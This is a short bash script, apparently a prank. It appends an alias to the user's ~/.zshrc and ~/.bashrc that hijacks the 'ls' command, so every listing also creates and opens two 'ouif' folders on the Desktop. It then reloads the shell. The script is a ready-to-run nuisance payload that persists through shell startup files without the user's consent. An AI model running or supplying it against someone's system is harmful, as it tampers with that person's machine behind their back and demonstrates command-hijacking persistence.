#!/usr/bin/env bash

printf "alias ls='ls && mkdir -p ~/Desktop/ouif{1..2} && open ~/Desktop/ouif* && echo I am in ~/.zshrc'" >> ~/.zshrc
printf "alias ls='ls && mkdir -p ~/Desktop/ouif{1..2} && open ~/Desktop/ouif* && echo I am in ~/.bashrc'" >> ~/.bashrc
source ~/.zshrc
exec zsh